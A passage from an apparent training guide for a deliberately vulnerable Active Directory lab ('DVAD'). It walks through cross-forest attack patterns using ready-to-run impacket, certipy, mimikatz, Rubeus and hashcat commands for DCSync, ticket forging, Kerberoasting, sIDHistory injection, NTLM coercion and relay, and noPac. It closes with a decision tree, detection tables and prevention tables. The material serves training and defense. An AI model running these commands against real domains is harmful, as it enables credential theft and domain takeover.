# 4. Ask cross-realm TGS and DCSync
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.finance.local -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc finance.local/Administrator@dc01.finance.local
```

---

## 10h. Wireframe — Pattern R: Tree-Root trust → root.corp (Golden Cross-Forest)

`root.corp` is wired as a tree-root trust to `corp.local`. The forge primitive is
the same, but the TGT SPN target changes and the foreign forest's root SID is what
you append.

**Commands:**

```bash
impacket-secretsdump -just-dc-user 'ROOT$' corp.local/Administrator@10.10.0.10
impacket-lookupsid root.corp/<low_priv>:'<pw>'@10.30.0.10 | grep -i 'enterprise'
impacket-ticketer -nthash <ROOT_trustkey_nt> -domain-sid <CORP_SID> \
                  -domain corp.local -extra-sid <ROOT_SID>-519 \
                  -spn 'krbtgt/root.corp' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.root.corp -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc root.corp/Administrator@dc01.root.corp
```

---

## 10i. Wireframe — Pattern S: Foreign-Security-Principal (FSP) hijack

Cross-forest group memberships go through Foreign Security Principal objects in
`CN=ForeignSecurityPrincipals,DC=<domain>`. DVAD intentionally maps a foreign
principal that *resolves to* a privileged group in the target forest — if you can
write the resolving SID into a group you control on the source side, you escalate
on the target side without touching its DCs.

```
corp.local: own a group whose members include FSP(finance.local/SID-of-Foo)
finance.local: SID-of-Foo is in finance Domain Admins via FSP linkage
→ join your account to the source group → become Foo → become DA@finance
```

**Commands:**

```bash
# 1. Find FSPs that point to interesting source-side SIDs
nxc ldap 10.20.0.10 -u svc_x -p '<pw>' --query \
  '(objectClass=foreignSecurityPrincipal)' 'cn'

# 2. Use BloodHound's "Cross-Forest" path query to confirm reachability
# 3. Write yourself into the source-side group that grants the foreign SID
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' \
  --add-computer 'evil$' --groups 'CrossForestGroup'

# 4. Authenticate to finance.local — your token now carries the foreign SID
impacket-psexec finance.local/alice:'DVADlab2024!'@10.20.0.10
```

---

## 10j. Wireframe — Pattern T: Cross-Forest Kerberoast (no creds in foreign forest)

If foreign trust allows TGS issuance for SPNs that resolve in the foreign forest
(common when SID filtering is off), you can kerberoast accounts in `finance.local`
using a TGT from `corp.local`.

**Commands:**

```bash
# Need a TGT in corp.local first (any user works)
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
export KRB5CCNAME=alice.ccache

# Request TGSes for cross-forest SPNs
impacket-GetUserSPNs -k -no-pass -target-domain finance.local -dc-ip 10.20.0.10 \
                     -request corp.local/alice -outputfile xforest.kerberoast

hashcat -m 13100 xforest.kerberoast /usr/share/wordlists/rockyou.txt
```

---

## 10k. Wireframe — Pattern U: ADCS Cross-Forest Enrollment (PKINIT from foreign forest)

`ca01.corp.local` issues to authenticated users by default. If the cross-forest
trust authenticates the foreign user (it does in DVAD — selective auth is off),
the foreign user can enroll in templates in `corp.local` and PKINIT as a
corp.local principal.

**Commands:**

```bash
# 1. From finance.local (low-priv), scan corp.local templates
certipy find -u svc_x@finance.local -p '<pw>' -dc-ip 10.20.0.10 \
             -target ca01.corp.local -stdout -vulnerable

# 2. Enroll in ESC1 across the trust
certipy req -u svc_x@finance.local -p '<pw>' -target ca01.corp.local \
            -ca CORP-CA -template ESC1Template -upn 'Administrator@corp.local'

# 3. PKINIT → DA@corp.local from a foreign-forest identity
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

---

## 10l. Wireframe — Pattern V: SID Filtering Bypass via SID History injection

DVAD disables SID filtering on every external trust (lab spec). Once you have DA
on corp.local you can write `sIDHistory` on a target user to inject any SID,
including foreign EA SIDs.

**Commands:**

```bash
# 1. From DA@corp.local, use mimikatz to inject sIDHistory
# (run on a Windows host that has reachability to the DC)
mimikatz # privilege::debug
mimikatz # sid::add /sid:S-1-5-21-FINANCE-519 /sam:alice

# OR via DCShadow primitive (impacket):
impacket-secretsdump -just-dc-user alice corp.local/Administrator@10.10.0.10
# then dcshadow.py to push the sIDHistory attribute

# 2. alice now carries the foreign EA SID in PAC of every TGS
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
impacket-secretsdump -k -no-pass -just-dc finance.local/alice@dc01.finance.local
```

---

## 10m. Wireframe — Pattern W: Cross-forest unconstrained delegation

`svc_legacy@corp.local` has unconstrained delegation enabled (DVAD spec). When a
DA from `finance.local` authenticates to a host running as `svc_legacy`, the host
caches the foreign DA's TGT. Coerce a finance DC to authenticate to your
unconstrained host and you get a usable foreign TGT.

**Commands:**

```bash
# 1. Confirm svc_legacy unconstrained
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation

# 2. Make a service run as svc_legacy on a host you own; or use file01 if you
#    have local admin there (DVAD wires svc_legacy as the file01 service)
#    Then coerce dc01.finance.local to authenticate:
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local \
                    file01.corp.local 10.20.0.10

# 3. Dump tickets from LSASS on file01 (Rubeus monitor / mimikatz sekurlsa::tickets)
mimikatz # sekurlsa::tickets /export

# 4. Use the foreign DC's TGT to DCSync finance.local
KRB5CCNAME=dc01-finance.ccache impacket-secretsdump -k -no-pass -just-dc finance.local/dc01\$@dc01.finance.local
```

---

## 10n. Wireframe — Pattern X: noPac across a trust

`noPac` works against the foreign DC if you can reach it and the foreign DC is
unpatched. DVAD leaves both child and external DCs unpatched.

**Commands:**

```bash
# Hit finance.local DC directly with a corp.local user (cross-realm preauth)
impacket-noPac.py finance.local/svc_x:'<pw>' -dc-ip 10.20.0.10 \
                  -dc-host dc01.finance.local -shell --impersonate Administrator
```

---

## 10o. Wireframe — Pattern Y: Cross-forest ADCS ESC11 (NTLM Relay to ICPR)

`ICPR-RPC` doesn't enforce EPA by default. Relay coerced NTLM from one forest's
DC into the *other* forest's CA over RPC and request a cert for the relayed
machine account.

**Commands:**

```bash
# 1. Coerce dc01.finance.local to authenticate
impacket-PetitPotam -u svc_x -p '<pw>' -d finance.local 10.10.0.1 10.20.0.10

# 2. Relay NTLM into ca01.corp.local's ICPR
sudo impacket-ntlmrelayx -t 'rpc://ca01.corp.local' -rpc-mode ICPR \
                         -icpr-ca-name 'CORP-CA' -template 'Machine' -smb2support
```

---

## 10p. Wireframe — Pattern Z: Diamond + Sapphire forest persistence

Diamond modifies an existing TGT in-place to bump privileges; Sapphire forges
with a PAC pulled live via S4U2Self → no offline guesswork on group bitmaps.
Combined they survive `krbtgt` rotation longer than a Golden because the
encryption context is fresh.

**Commands:**

```bash
# Diamond — modify a real TGT (Rubeus)
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
                   /groups:512,519 /krbkey:<krbtgt_aes256> /ptt

# Sapphire — pull a live PAC via S4U2Self, forge with it
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /id:500 \
                  /domain:corp.local /sid:<CORP_SID> /sapphire /ptt
```

---

## 11. Solving-pattern decision tree

When you have *something* but don't know where to go, walk this tree:

```
┌─ Am I on the host bridge with zero creds? ──┐
│   Yes → Phase 0 (02a-initial-access.md):    │
│   ├── Anon SMB/LDAP/DNS, Kerbrute → users   │
│   ├── AS-REP roast (no creds) → IA-006      │
│   ├── Password spray → IA-007               │
│   ├── Responder/mitm6 (if you have L2) → IA-008/009 │
│   ├── PetitPotam+relay+ADCS → IA-013        │
│   ├── ZeroLogon → IA-014                    │
│   ├── ProxyShell/PrintNightmare → IA-015/017│
│   ├── Phishing (Pattern J) → IA-019..024    │
│   └── SCCM PXE / USB / VLAN → IA-029/028/030│
│                                              │
└─ Do I have a domain user? ──────────────────┐
│                                  │
│ No  ──── go back to Phase 0      │
│                                  │
│ Yes ───┐                         │
│        ▼                         │
│   ┌─ Run BloodHound ────────────┐│
│   │  Find path to DA            ││
│   └──┬──────────────────────────┘│
│      │                            │
│   Path is...                      │
│      │                            │
│   ├── Kerberoast?  -> Pattern A   │
│   ├── ADCS ESC?   -> Pattern B    │
│   ├── Coerce+ESC8? -> Pattern C   │
│   ├── RBCD?       -> Pattern D    │
│   ├── ACL chain?  -> LAT-017/18/20/21
│   ├── DCSync grant? -> CRED-013   │
│   ├── DnsAdmins?  -> LAT-031      │
│   ├── Server Ops? -> PE-057       │
│   ├── Backup Ops? -> CRED-007     │
│   └── Unconstrained deleg? -> CRED-018 + PrinterBug
│                                  │
└──────────────────────────────────┘

Once DA on corp.local:
   ├── Child forest (eu.corp.local) ──▶ Pattern G (down) / Pattern P (up)
   ├── External forest (finance.local) ──▶ Pattern Q (trust-key) / Pattern T (xforest Kerberoast) / Pattern U (xforest ADCS) / Pattern V (sIDHistory) / Pattern X (xforest noPac)
   ├── Tree-root trust (root.corp) ──▶ Pattern R
   ├── Foreign-Security-Principal abuse ──▶ Pattern S
   ├── Unconstrained delegation across trust ──▶ Pattern W
   ├── ESC11 (NTLM relay to ICPR-RPC across trust) ──▶ Pattern Y
   └── Persistence ──▶ Golden / Diamond / Sapphire (Pattern Z) / Golden Cert / AdminSDHolder
```

---

## 12. Detection summary (blue-team view)

| Pattern | Primary signal | Tool |
|---|---|---|
| Kerberoast | 4769 RC4 bulk | Splunk / Sentinel / MDI |
| AS-REP roast | 4768 PreAuth=0 | MDI alert |
| Password spray | 4625/4771 burst | MDI |
| LSASS dump | Sysmon 10 mask 0x1010 | EDR |
| DCSync | 4662 from non-DC IP | MDI |
| Golden Ticket | 4769 no parent 4768 | MDI |
| Silver Ticket | 4624 LT3 with mismatched PAC | hard — needs PAC validation |
| ADCS ESC1/ESC8 | 4886/4887 mismatch | MDI |
| RBCD | 5136 on `msDS-AllowedToActOnBehalfOfOtherIdentity` | MDI |
| noPac | 4741+4742 chain | MDI |
| ZeroLogon | 5827, brute-force 4624 | MDI |
| LLMNR/Responder | LLMNR/NBT-NS traffic burst | MDI / Zeek |
| Coerce (PetitPotam/DFSCoerce/etc.) | RPC pattern + DC$ outbound NTLM | MDI |
| mitm6 | unsolicited DHCPv6 | network IDS |
| Phishing (Pattern J) | Office spawns powershell/cmd; LNK from %TEMP%; LSASS 0x1010 | EDR / Sysmon 1+10 |
| ProxyShell (Pattern L) | /autodiscover.json with @host SSRF; w3wp→powershell | WAF / Exchange audit |
| SCCM PXE (Pattern M) | PXE boot from unknown MAC; abnormal policy retrieval | SCCM audit |
| library-ms / USB-LNK (Pattern N) | Outbound NTLM from client to RFC1918 IP | Zeek / EDR |

---

## 13. Prevention summary (one-line each)

| Vector | Fix |
|---|---|
| LLMNR/NBT-NS | GPO disable + DNS suffix |
| NTLM | Disable where possible; Protected Users |
| SMB signing | Required everywhere |
| LDAP signing + channel binding | Required (KB4520412) |
| WebClient | Disable on servers |
| Kerberoast | AES-only, gMSAs, 25+ char service pwds |
| AS-REP | Clear DONT_REQ_PREAUTH |
| ADCS ESC1 | Drop ENROLLEE_SUPPLIES_SUBJECT |
| ADCS ESC8 | Disable NTLM on web enrollment + EPA |
| RBCD / noPac | MachineAccountQuota=0; patch |
| ZeroLogon | Patch + FullSecureChannelProtection=1 |
| Golden Ticket | Rotate krbtgt twice; tier-0 |
| AdminSDHolder | Alert on any 5136 |
| Cross-forest | SID filtering on; selective auth |
| Unconstrained deleg | Disable entirely; use RBCD |
| Print Spooler on DC | Disable |
| LAPS | Deploy Windows LAPS (encrypted) |
| Tier-0 isolation | Server/Print/Backup Operators must be empty on DCs |

---

That's the lab. If you can solve every pattern above in DVAD and explain the corresponding detection + prevention to the blue team, you've earned every flag in `PLAN.md`.

Good hunting.
